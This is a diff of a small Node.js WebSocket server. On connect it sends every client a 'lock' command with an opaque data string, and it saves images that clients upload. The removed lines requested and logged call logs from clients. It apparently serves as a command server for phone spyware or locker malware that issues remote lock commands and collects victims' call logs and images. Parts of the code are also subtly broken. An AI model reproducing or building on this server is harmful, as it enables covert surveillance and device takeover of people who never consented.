@@ -1,43 +1,37 @@
-
 const WebSocket = require('ws');
 const fs = require('fs');
+const http = require('http');
+const server = http.createServer((req, res) => {
+  res.end('WebSocket Server Running');
+});
 
-const wss = new WebSocket.Server({ port: 8080 });
+const wss = new WebSocket.Server({ server });
 
 wss.on('connection', (ws) => {
   console.log('Client connected');
-console.clear();
-       ws.send("call_log");
+  //   var data = fs.readFileSync('lol.webp')
+  //const base64Data = data.toString('base64');
+  const text = {
+    commands: "lock",
+    data: "7058310870:?",
+  };
+  ws.send(JSON.stringify(text))
   ws.on('message', (message) => {
-    console.log(`Received message: ${message}`);
-  
+    if (typeof message === 'object' && message !== null) {
+      var msg = JSON.parse(message)
+      var type = msg.type;
+      var data = msg.data;
+      if (type == "image") { fs.writeFileSync('received_image.png', data, 'base64'); };
+    }
+    else if (typeof message === 'string') {
+      console.log(message.toString());
+    };
   });
-
-  ws.on('call_log',(msg) =>{
-    console.log('Received call logs from client : ${msg}')
-    ws.send("done");
-  });
-
   ws.on('close', () => {
     console.log('Client disconnected');
   });
 });
-
-function saveFileData(fileData) {
-  // Change the file path and name to where you want to save the uploaded file
-  const filePath = './uploads/' + Date.now() + '.txt';
-
-  // Write the file data to the file
-  fs.writeFile(filePath, fileData, (err) => {
-    if (err) {
-      console.error('Error saving file:', err);
-    } else {
-      console.log('File saved:', filePath);
-    }
-  });
-}
-
-function handleTextMessage(text) {
-  // Handle the received text message
-  console.log('Received text message:', text);
-}
+const PORT = 8080;
+server.listen(PORT, () => {
+  console.log(`WebSocket Server listening on port ${PORT}`);
+});
